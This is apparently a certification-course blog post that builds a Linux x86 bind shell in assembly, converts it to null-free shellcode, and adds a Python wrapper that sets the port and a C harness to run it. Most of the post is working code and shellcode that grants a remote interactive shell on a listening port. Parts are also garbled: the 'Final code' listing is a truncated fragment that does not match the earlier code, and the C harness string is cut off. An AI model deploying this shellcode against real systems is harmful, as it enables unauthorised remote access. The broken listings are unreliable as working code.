#### Introduction

These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE certification. Today we are going to have a close 
look at Linux Bind Shells. 

A Bind shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Reverse Shell, binding to a local port of 
the compromised system, instead of arranging a specific connection on a trivial address.

The first assignment from the seven requires the creation of a Bind Shell through the Assembly language, and converting such into shellcode. Moreover, it is required to write a wrapper in any language of preference that is capable of easily configuring the port.

#### Theory

In order to create a Bind Shell, 6 main functions are required:

+ Socket

+ Bind

+ Listen

+ Accept

+ Dup2

+ Execve

#### Time to stick our hands into the mud

The first thing required is to clean the registers, as when we execute our program, it will work as a charm, however, when introduced into a real program within a context of 
binary exploitation with different variables that alter the registers, it may not. Due to this, it's better to have a set of instructions that clean the registers that will be 
employed:

```term
global _start

section .text

_start:

       xor eax, eax           ; Zeroes out EAX.
       xor ebx, ebx           ; Zeroes out EBX.
       xor ecx, ecx           ; Zeroes out ECX.
       xor edx, edx           ; Zeroes out EDX.
       xor esi, esi           ; Zeroes out ESI.
```

##### Socket

###### Creates an endpoint for communication

Our next step is to initialize the socket. In order to concrete such action, it is required to move the value of the socket (359) syscall into eax. I have chosen to push the 
value as a word into the ax register, in order to avoid null characters. Furthermore, according to the syscall man page for socket, the required flags involve domain (EBX), type 
(ECX) and protocol (EDX). A common combination when it comes to remote shells is AF_INET, SOCK_STREAM. According to [this file](https://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html), the value of AF_INET is 2 and SOCK_STREAM 1, therefore, this will be reflected on the EBX and ECX 
registers. Finally, the value of protocol (EDX) isn't actually very relevant. Due to this, EDX is simply pushed.

```term
socket:

       push word 359          ; Pushes word 359 (socket) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       mov bl, 2              ; Moves value 2 into bl, giving the value AF_INET.
       mov cl, 1              ; Moves value 1 into bl, giving the value SOCK_STREAM.
       push edx               ; There isn't anything really needed within this parameter, so 0 is pushed from EDX.
       int 0x80               ; Call to kernel.
       mov esi, eax           ; Saves the value of eax for sockfd values later on.
```

As you can see, the value of EAX has been copied to ESI, this will be very useful as storage of the file descriptor value from socket for later operations.

##### Bind

###### Binds a name to a socket

The next step is to concrete the Bind function. The process is quite similar to socket, the value of the syscall in ```/usr/include/x86_64-linux-gnu/asm/unistd_32.h``` is 361.
According to the manpage, the arguments are ```int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);```. As aforementioned, ESI will be used to satisfy the 
sockfd argument. Furthermore, in order to satisfy the struct, it is required to push the following values:

+ 0            (As it is required to push 0, the instruction PUSH EDX will be used.)
+ IP Address   (As this is a bind shell, it is required to listen in all interfaces. Therefore, this will be set to 0 through pushing EDX.)
+ Chosen Port  (The chosen port will be pushed in hex as a word.)
+ AF_INET

Finally, it is regarding to point out in EDX the length of such struct, which is 16.

```term
bind:

       push word 361          ; Pushes word 361 (bind) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
       push edx               ; As the following parameter is a const struct sockaddr, and this is a bind shell, the first values aren't actually required, therefore, zeroes are 
                              ; pushed through EDX.
       push edx               ; The same as stated above.
       push word 0x2823       ; Pushes the word 9000 into the stack.
       push word 0x02         ; Pushes AF_INET into the stack.
       mov ecx, esp           ; Copies the value of ESP into ECX.
       mov dl, 16             ; The value 16 is inserted into DL, as this argument requires the length of the struct.
       int 0x80               ; Call to kernel.
```

##### Listen

###### Listens for connections on a socket

Time to set the listen syscall. This is starting to come together, isn't it? According to the manpage for such syscall the arguments are the following: 
```term
int listen(int sockfd, int backlog);
```

This is quite easy to concrete. As in the previous snippets, the value of ESI will be copied into EBX in order to point to the socket file descriptor. Moreover, as the backlog 
isn't crucial (defines the maximum length to which the queue of pending connections for sockfd may grow) it will simply be set to 0.

```term
listen:

       push word 363          ; Pushes word 363 (listen) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
       xor ecx, ecx           ; Zeroes ECX out.
       push ecx               ; Pushes ECX (0), as the backlog isn't really important.
       int 0x80               ; Call to kernel.
```

##### Accept

###### Accepts a connection on a socket

Interestingly enough, there is no syscall in ```/usr/include/x86_64-linux-gnu/asm/unistd_32.h``` for accept. However, accept4 (364) exists, which grants a similar functionality. 
Moreover, if the arguments are satisfied with 0, the syscall will act as accept.

Snippet from the manpage:

```If flags is 0, then accept4() is the same as accept().```

Arguments for accept4:```int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);```

```term
accept4:

       push word 364          ; Pushes word 364 (accept4) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
       xor ecx, ecx           ; As there is no syscall for accept, accept4 grants the possibility of a conversion from accept4 to accept if the values are satisfied with 0.
       xor edx, edx           ; Due to this event, the following registers will be set to 0 to cause such circumstance.
       xor esi, esi           ; The same as stated above.
       int 0x80               ; Call to kernel.
       mov esi, eax           ; Saves the value of eax for sockfd values later on.
```

As you can see, ESI is once again saving the value of EAX, exactly as when we started. This is due to the fact that now the file descriptor for socket is no longer required. And 
now it is important to use the accept() file descriptor for the next syscalls.

##### Dup2

###### Duplicate a file descriptor

We now may have a bind shell. However, this is completely useless if it isn't functional, right? This is where dup2 comes in, our little friend will iterate 3 times in order to 
copy into our accepted connection the STDIN (0), STDOUT (1), and STDERR (2) file descriptors, therefore making the shell interactive. There are two ways to perform this task, 
either copying and writing three times or performing a loop. The latter sounds more fun, right? ECX will be used with a JNZ (jump if the zero flag (ZF) is not set) instruction 
as well, performing a loop which will not stop until ECX reaches to zero through a dec cl instruction.

```term
       mov cl, 3              ; Starts counter for dup2
       
dup2:
       push word 63           ; Pushes word 63 (dup2) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the accept syscall.
       dec cl                 ; Decrements cl in order to set the zero flag (ZF)
       int 0x80               ; Call to kernel

       jnz dup2               ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.
```

##### Execve

###### Execute program

This may be the last syscall to be initialized, yet it is the most important, no shell, no access! The process is quite simple, a group of three dwords containing the string 
```////bin/bash``` will be copied into ebx through PUSH and MOV instructions. Moreover, the value of EDX will be set to 0, as envp is not required. Finally, as ECX needs to 
point to the string, EBX will be pushed into the stack, therefore ECX copying its value through a MOV instruction.

```term
execve:

       xor eax, eax           ; Zeroes out EAX
       push eax               ; Pushes EAX (0x00000000)

       PUSH 0x68736162        ; hsab
       PUSH 0x2f6e6962        ; /nib
       PUSH 0x2f2f2f2f        ; ////

       mov ebx, esp           ; Copies the pushed instructions into EBX.
       push eax               ; Pushes EAX (0x00000000)

       mov edx, esp           ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0

       push ebx               ; Pushes ////bin/bash into the stack
       mov ecx, esp           ; Copies such value to ECX
       push word 11           ; Pushes word 11 (execve) into the stack.
       pop ax                 ; Pops such word into ax so there are no nulls.
       int 0x80               ; Calls to kernel
```

Final code:

```term
global _start

section .text

_start:

       xor eax, eax           ; Zeroes out EAX.
       xor ebx, ebx           ; Zeroes out EBX.
       xor ecx, ecx           ; Zeroes out ECX.

       pop ax                 ; Pops such word into ax so there are no nulls.
       mov bl, 2              ; Moves value 2 into bl, giving the value AF_INET.
       mov cl, 1              ; Moves value 1 into bl, giving the value SOCK_STREAM.
       push edx               ; There isn't anything really needed within this parameter, so 0 is pushed from EDX.
       int 0x80               ; Call to kernel.

```

Let's assemble and link the file!

#### The Wrapper

As stated in the introduction, one additional detail given in the assignment is to create a wrapper (in any language) that easily configures the port for the bind shell.

Wrapper code:

```term
import socket, sys, struct

if len(sys.argv) != 2:

      print "[*] Example: /usr/bin/python wrapper.py <port>"
      sys.exit(1)

port = sys.argv[1]
port = int(port)
port = socket.htons(port)
hexport = hex(port)
hexport = struct.pack("<H", port).encode("hex")

final_port = "\\x"+"\\x".join(a+b for a,b in zip(hexport[::2],hexport[1::2]))

buf = ("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\x68\\x67\\x01\\x66\\x58\\xb3\\x02\\xb1\\x01\\x52\\xcd\\x80\\x89\\xc6\\x66\\x68\\x69\\x01\\x66"
"\\x58\\x89\\xf3\\x52\\x52\\x66\\x68"
+ final_port +
"\\x66\\x6a\\x02\\x89\\xe1\\xb2"
"\\x10\\xcd\\x80\\x66\\x68\\x6b\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x51\\xcd"
"\\x80\\x66\\x68\\x6c\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x31\\xd2\\x31\\xf6"
"\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x66\\x6a\\x3f\\x66\\x58\\x89\\xf3\\xfe\\xc9"
"\\xcd\\x80\\x75\\xf3\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69"
"\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1"
"\\x66\\x6a\\x0b\\x66\\x58\\xcd\\x80")

print '"' + (buf) + '"'
```

###### Executing the wrapper:

```term
whitecr0wz@SLAE:~/assembly/assignments/assignment_1$ python wrapper.py 57326 
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\x68\x67\x01\x66\x58\xb3\x02\xb1\x01\x52\xcd\x80\x89\xc6\x66\x68\x69\x01\x66\x58\x89\xf3\x52\x52\x66\x68\xdf\xee\x66\x6a\x02\x89\xe1
\xb2\x10\xcd\x80\x66\x68\x6b\x01\x66\x58\x89\xf3\x31\xc9\x51\xcd\x80\x66\x68\x6c\x01\x66\x58\x89\xf3\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x66\x6a\x3f\x66\x58\x89\xf3\
xfe\xc9\xcd\x80\x75\xf3\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x66\x6a\x0b\x66\x58\xcd\x80"
whitecr0wz@SLAE:~/assembly/assignments/assignment_1$
```

Let's test this on a C file to make sure that the shellcode could work on a real environment:

```term
cat bind.c 
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\x68\x67\x01\x66\x58\xb3\x02\xb1\x01\x52\xcd\x80\x89\xc6\x66\x68\x69\x01\x66\x58\x89\xf3\x52\x52\x66\x68\xdf\xee\x66\x6a\x02\x89\xe1

;

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
```
